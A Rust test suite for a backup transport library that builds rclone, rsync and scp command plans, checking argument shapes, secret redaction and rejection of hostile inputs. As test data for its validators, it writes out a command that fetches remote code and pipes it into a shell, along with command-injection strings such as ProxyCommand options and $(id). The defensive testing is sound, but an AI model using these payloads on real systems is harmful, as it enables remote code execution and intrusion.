//! The shared contract suite on every transport kind, plus exact-shape and adversarial checks.

use std::collections::BTreeMap;
use transport::testing::{SENTINEL, contract_suite, fixtures, hostile_inputs, operations};
use transport::validate;
use transport::{
    CopyOptions, Credentials, EnvValue, Operation, PlanError, RcloneSpec, RemoteKind, Secret,
    SpecError, SshTarget, TransportKind, TransportSpec, plan,
};

type TestResult = Result<(), Box<dyn std::error::Error>>;

#[test]
fn every_kind_passes_the_contract_suite() {
    let all = fixtures();
    // One fixture per backend, three SSH kinds on two hosts, and managed.
    assert_eq!(all.len(), RemoteKind::ALL.len() + 6 + 1);
    for kind in TransportKind::ALL {
        assert!(all.iter().any(|f| f.spec.kind() == kind), "{kind:?}");
    }
    for fx in &all {
        contract_suite(fx);
    }
}

fn rclone(path: &str) -> Result<TransportSpec, SpecError> {
    RcloneSpec::new(RemoteKind::S3, "offsite", path, BTreeMap::new()).map(TransportSpec::Rclone)
}

fn creds() -> Result<Credentials, Box<dyn std::error::Error>> {
    Ok(Credentials::new(vec![
        ("access_key_id".to_owned(), Secret::new("AKIDEXAMPLE")),
        ("secret_access_key".to_owned(), Secret::new(SENTINEL)),
    ])?)
}

#[test]
fn rclone_plan_has_the_documented_shape() -> TestResult {
    let spec = rclone("nodivara/site")?;
    let c = creds()?;
    let p = plan(&spec, Some(&c), &Operation::Verify)?;
    assert_eq!(p.program, "rclone");
    assert_eq!(
        p.args,
        [
            "lsd",
            "--config=",
            "--ask-password=false",
            "--",
            "offsite:nodivara/site"
        ]
    );
    let names: Vec<&str> = p.env.iter().map(|(n, _)| n.as_str()).collect();
    assert_eq!(
        names,
        [
            "RCLONE_CONFIG_OFFSITE_TYPE",
            "RCLONE_CONFIG_OFFSITE_ACCESS_KEY_ID",
            "RCLONE_CONFIG_OFFSITE_SECRET_ACCESS_KEY"
        ]
    );
    assert_eq!(p.env[0].1, EnvValue::Plain("s3".to_owned()));
    assert!(p.env[2].1.is_secret());
    // The log rendering hides the secret values (the redactor may rewrite `***` further).
    let shown = format!("{p}");
    assert!(!shown.contains("AKIDEXAMPLE"), "{shown}");
    assert!(
        shown.contains("RCLONE_CONFIG_OFFSITE_TYPE=\"s3\""),
        "{shown}"
    );
    assert!(!format!("{p}").contains(SENTINEL));

    let copy = Operation::Push {
        local: "/data/site".to_owned(),
        opts: CopyOptions {
            excludes: vec!["*.log".to_owned()],
            dry_run: true,
            transfers: Some(8),
        },
    };
    let p = plan(&spec, Some(&c), &copy)?;
    assert_eq!(
        p.args,
        [
            "copy",
            "--config=",
            "--ask-password=false",
            "--transfers=8",
            "--dry-run",
            "--exclude=*.log",
            "--",
            "/data/site",
            "offsite:nodivara/site"
        ]
    );
    let p = plan(&spec, Some(&c), &Operation::Quota)?;
    assert_eq!(p.args[0..2], ["about", "--config="]);
    assert!(p.args.contains(&"--json".to_owned()));
    Ok(())
}

#[test]
fn ssh_family_plans_use_the_agent_and_refuse_prompts() -> TestResult {
    let t = SshTarget::new("backup.example.test", "deploy", None, "/srv/in")?;
    let push = Operation::Push {
        local: "/data".to_owned(),
        opts: CopyOptions::default(),
    };
    let rsync = plan(&TransportSpec::Rsync(t.clone()), None, &push)?;
    assert_eq!(rsync.program, "rsync");
    assert!(
        rsync
            .args
            .iter()
            .any(|a| a.starts_with("--rsh=ssh -o BatchMode=yes"))
    );
    assert_eq!(
        rsync.args[rsync.args.len() - 3..],
        ["--", "/data", "deploy@backup.example.test:/srv/in"]
    );
    let scp = plan(&TransportSpec::Scp(t.clone()), None, &push)?;
    assert_eq!(scp.program, "scp");
    assert!(
        scp.args
            .windows(2)
            .any(|w| w == ["-o", "StrictHostKeyChecking=yes"])
    );
    assert!(scp.args.windows(2).any(|w| w == ["-P", "22"]));
    // scp cannot honour excludes or a dry run: refuse instead of quietly ignoring them.
    let tuned = Operation::Push {
        local: "/data".to_owned(),
        opts: CopyOptions {
            dry_run: true,
            ..CopyOptions::default()
        },
    };
    assert_eq!(
        plan(&TransportSpec::Scp(t.clone()), None, &tuned).err(),
        Some(PlanError::UnsupportedOperation(TransportKind::Scp))
    );
    // rclone-only operations on an SSH kind.
    for op in [
        Operation::Quota,
        Operation::Authorize,
        Operation::SpeedCleanup,
    ] {
        assert_eq!(
            plan(&TransportSpec::Rsync(t.clone()), None, &op).err(),
            Some(PlanError::UnsupportedOperation(TransportKind::Rsync))
        );
    }
    // IPv6 literals are bracketed in host:path forms but not for ssh.
    let v6 = SshTarget::new("2001:db8::1", "deploy", None, "/srv/in")?;
    assert_eq!(v6.remote_arg(), "deploy@[2001:db8::1]:/srv/in");
    assert_eq!(v6.login(), "deploy@2001:db8::1");
    Ok(())
}

#[test]
fn managed_is_declared_but_unsupported_for_everything() -> TestResult {
    for op in operations() {
        assert_eq!(
            plan(&TransportSpec::Managed, None, &op).err(),
            Some(PlanError::UnsupportedManaged)
        );
    }
    let c = creds()?;
    assert_eq!(
        plan(&TransportSpec::Managed, Some(&c), &Operation::Verify).err(),
        Some(PlanError::UnsupportedManaged)
    );
    assert_eq!(
        PlanError::UnsupportedManaged.to_string(),
        "transport_unsupported_managed"
    );
    Ok(())
}

#[test]
fn credentials_are_refused_for_ssh_kinds_and_clashes_are_refused() -> TestResult {
    let t = SshTarget::new("h.example.test", "u", None, "/p")?;
    let c = creds()?;
    for spec in [
        TransportSpec::Rsync(t.clone()),
        TransportSpec::Scp(t.clone()),
        TransportSpec::SshPipe(t),
    ] {
        assert_eq!(
            plan(&spec, Some(&c), &Operation::Verify).err(),
            Some(PlanError::CredentialsNotAccepted(spec.kind()))
        );
    }
    // A credential name can no longer be a plain option at all, so it can never be stored in a
    // spec or shadow the sealed one.
    let mut options = BTreeMap::new();
    options.insert("secret_access_key".to_owned(), "plain".to_owned());
    assert!(RcloneSpec::new(RemoteKind::S3, "r", "", options).is_err());
    // Duplicate credential names and the reserved `type` option are refused at construction.
    assert!(
        Credentials::new(vec![
            ("token".to_owned(), Secret::new("1")),
            ("token".to_owned(), Secret::new("2"))
        ])
        .is_err()
    );
    assert!(Credentials::new(vec![("type".to_owned(), Secret::new("1"))]).is_err());
    assert!(Credentials::new(vec![("token".to_owned(), Secret::new("1\n2"))]).is_err());
    Ok(())
}

#[test]
fn executing_or_file_reading_rclone_options_are_refused() -> TestResult {
    let hostile = [
        (RemoteKind::Sftp, "ssh"),
        (RemoteKind::Sftp, "key_file"),
        (RemoteKind::Sftp, "known_hosts_file"),
        (RemoteKind::Sftp, "pubkey_file"),
        (RemoteKind::Sftp, "env_auth"),
        (RemoteKind::Webdav, "bearer_token_command"),
        (RemoteKind::S3, "env_auth"),
        (RemoteKind::S3, "no_such_option"),
        // Allowed for another backend, not for this one.
        (RemoteKind::S3, "host"),
    ];
    for (kind, name) in hostile {
        let mut options = BTreeMap::new();
        options.insert(name.to_owned(), "sh -c 'curl evil|sh'".to_owned());
        assert!(
            RcloneSpec::new(kind, "x", "", options).is_err(),
            "{name} on {kind:?}"
        );
        // As a credential: refused at construction or, when valid for another backend, at plan.
        let spec = TransportSpec::Rclone(RcloneSpec::new(kind, "x", "", BTreeMap::new())?);
        if let Ok(c) = Credentials::new(vec![(name.to_owned(), Secret::new("v"))]) {
            assert!(
                plan(&spec, Some(&c), &Operation::Verify).is_err(),
                "credential {name} on {kind:?}"
            );
        }
    }
    // The stored-row path applies the same rule.
    assert!(
        TransportSpec::from_config_json(
            "rclone",
            r#"{"remote_kind":"sftp","remote":"x","path":"","options":{"ssh":"/bin/sh"}}"#
        )
        .is_err()
    );
    // A listed option still works.
    let mut ok = BTreeMap::new();
    ok.insert("host".to_owned(), "example.org".to_owned());
    assert!(RcloneSpec::new(RemoteKind::Sftp, "x", "", ok).is_ok());
    Ok(())
}

#[test]
fn field_rules_reject_option_injection() {
    for bad in [
        "-oProxyCommand=x",
        "--rsh=x",
        "a\nb",
        "a\0b",
        "$(id)",
        "`id`",
        "a;b",
        "a b",
        "a|b",
        "evil.example.test -o x",
        "-host",
        "ho\u{202e}st",
        "h\u{ff4f}st",
    ] {
        assert!(validate::host(bad).is_err(), "host {bad:?}");
        assert!(validate::user(bad).is_err(), "user {bad:?}");
        assert!(validate::remote_name(bad).is_err(), "remote {bad:?}");
        assert!(validate::ssh_path(bad).is_err(), "ssh path {bad:?}");
    }
    for bad in [
        "-x",
        "--x",
        "a\nb",
        "a\0b",
        "a\u{202e}b",
        "a/../b",
        &"a".repeat(2000),
    ] {
        assert!(validate::rclone_path(bad).is_err(), "rclone path {bad:?}");
    }
    for bad in ["relative", "-x", "./x", "host:/x", "/a/../b", "/a\nb"] {
        assert!(validate::local_path(bad).is_err(), "local path {bad:?}");
    }
    assert!(validate::host("2001:db8::1").is_ok());
    assert!(validate::host("a-b.example.test").is_ok());
    assert!(validate::host("a..b").is_err());
    assert!(validate::host("-a.example.test").is_err());
    assert!(validate::port(0).is_err());
    assert!(validate::count(0, 64).is_err() && validate::count(65, 64).is_err());
    // Spaces are fine in an rclone path (one argument, no shell) but never in an SSH path.
    assert!(validate::rclone_path("My Drive/backups").is_ok());
    assert!(validate::ssh_path("/srv/My Drive").is_err());
}

#[test]
fn validation_errors_never_echo_the_value() {
    let secret_like = format!("-{SENTINEL}");
    for err in [
        validate::host(&secret_like).err(),
        validate::ssh_path(&secret_like).err(),
        validate::rclone_path(&secret_like).err(),
        validate::remote_name(&secret_like).err(),
    ] {
        let text = format!(
            "{:?} {}",
            err,
            err.map(|e| e.to_string()).unwrap_or_default()
        );
        assert!(!text.contains(SENTINEL), "{text}");
    }
}

#[test]
fn every_hostile_input_is_rejected_or_inert_for_a_plain_spec() -> TestResult {
    // The suite already does this for fixtures; here the rclone path accepts the widest set, so
    // check the accepted ones concretely: one argument, after `--`.
    for h in hostile_inputs() {
        let Ok(spec) = rclone(&h) else { continue };
        let p = plan(
            &spec,
            None,
            &Operation::Push {
                local: "/d".to_owned(),
                opts: CopyOptions::default(),
            },
        )?;
        let sep = p
            .args
            .iter()
            .position(|a| a == "--")
            .ok_or("no separator")?;
        assert_eq!(p.args.len(), sep + 3, "{h:?}: extra arguments");
        assert_eq!(p.args[sep + 2], format!("offsite:{h}"));
    }
    Ok(())
}

#[test]
fn stored_config_is_revalidated_when_read_back() {
    let good = r#"{"remote_kind":"s3","remote":"r","path":"p","options":{}}"#;
    assert!(TransportSpec::from_config_json("rclone", good).is_ok());
    for (kind, config) in [
        ("rclone", r#"{"remote_kind":"s3","remote":"-r","path":"p"}"#),
        (
            "rclone",
            r#"{"remote_kind":"s3","remote":"r","path":"--x"}"#,
        ),
        (
            "rclone",
            r#"{"remote_kind":"nope","remote":"r","path":"p"}"#,
        ),
        (
            "rclone",
            r#"{"remote_kind":"s3","remote":"r","path":"p","options":{"type":"x"}}"#,
        ),
        ("rclone", "[]"),
        (
            "rsync",
            r#"{"host":"-oProxyCommand=x","user":"u","port":22,"path":"/p"}"#,
        ),
        (
            "rsync",
            r#"{"host":"h","user":"u","port":70000,"path":"/p"}"#,
        ),
        ("rsync", r#"{"host":"h","user":"u","port":0,"path":"/p"}"#),
        ("scp", r#"{"host":"h","user":"u","path":"/a b"}"#),
        ("telnet", "{}"),
        ("ssh_pipe", "not json"),
    ] {
        assert!(
            TransportSpec::from_config_json(kind, config).is_err(),
            "{kind} {config}"
        );
    }
    assert_eq!(
        TransportSpec::from_config_json("managed", "{}"),
        Ok(TransportSpec::Managed)
    );
}

/// Credentials and plain settings are two disjoint sets per backend: a credential name is refused
/// as a stored plain option (it would sit in plaintext and could reach a command line), and a
/// plain name is refused as a sealed credential.
#[test]
fn credential_options_and_plain_options_never_mix() -> TestResult {
    for kind in RemoteKind::ALL {
        assert!(
            !kind.credential_options().is_empty(),
            "{kind:?} has credentials"
        );
        for name in kind.credential_options() {
            assert!(
                !kind.plain_options().contains(name),
                "{kind:?}: {name} is in both sets"
            );
            let mut options = BTreeMap::new();
            options.insert((*name).to_owned(), "value-of-some-length".to_owned());
            let refused = RcloneSpec::new(kind, "r", "", options).err();
            assert!(
                refused.is_some(),
                "{kind:?}: credential option {name} was accepted as a plain option"
            );
            assert!(
                !format!("{refused:?}").contains("value-of-some-length"),
                "the value must never be echoed"
            );
        }
        for name in kind.plain_options() {
            let mut options = BTreeMap::new();
            options.insert((*name).to_owned(), "plain-value".to_owned());
            assert!(
                RcloneSpec::new(kind, "r", "", options).is_ok(),
                "{kind:?}: plain option {name} was refused"
            );
        }
    }
    // The other direction: a sealed credential must be a credential name of some backend.
    assert!(Credentials::new(vec![("region".to_owned(), Secret::new("x"))]).is_err());
    assert!(Credentials::new(vec![("secret_access_key".to_owned(), Secret::new("x"))]).is_ok());
    Ok(())
}
